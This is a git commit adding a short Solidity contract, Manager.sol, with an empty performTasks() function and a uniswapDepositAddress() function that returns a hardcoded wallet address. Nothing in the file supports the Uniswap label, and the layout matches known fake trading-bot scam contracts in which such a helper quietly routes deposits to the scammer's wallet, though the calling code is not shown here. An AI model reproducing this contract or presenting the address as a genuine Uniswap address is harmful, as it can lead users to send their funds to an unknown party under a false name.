16c9a809ef70e445ff351904fae3c3c4baa0c0b0
omufx <103666679+omufx@users.noreply.github.com>
2022-09-29 00:12:08 +0500

    Create Manager.sol

---
+++ Manager.sol
@@ -0,0 +1,12 @@
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x8ab91c87F7e30CE113A8b2AAEC96D40bF00c74Fe;
+	}
+}
